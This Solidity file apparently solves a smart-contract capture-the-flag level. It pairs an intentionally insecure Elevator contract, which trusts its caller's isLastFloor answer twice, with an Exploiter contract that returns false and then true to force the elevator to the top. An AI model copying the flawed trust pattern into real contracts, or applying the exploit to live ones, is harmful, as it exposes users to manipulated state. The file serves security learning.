// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint) external returns (bool);
}

contract Elevator {
    bool public top;
    uint public floor;

    function goTo(uint _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}

contract Exploiter is Building {
    Elevator private victim;
    address private owner;
    bool private firstCall;

    constructor(Elevator _victim) {
        owner = msg.sender;
        victim = _victim;
        firstCall = true;
    }

    function goTo(uint256 floor) public {
        victim.goTo(floor);
    }

    function isLastFloor(uint256) external override returns (bool) {
        // if the Elevator call us the first time return `false` to trick him
        // but return `true` if the second time to exploit it
        if (firstCall) {
            firstCall = false;
            return false;
        } else {
            return true;
        }
    }
}
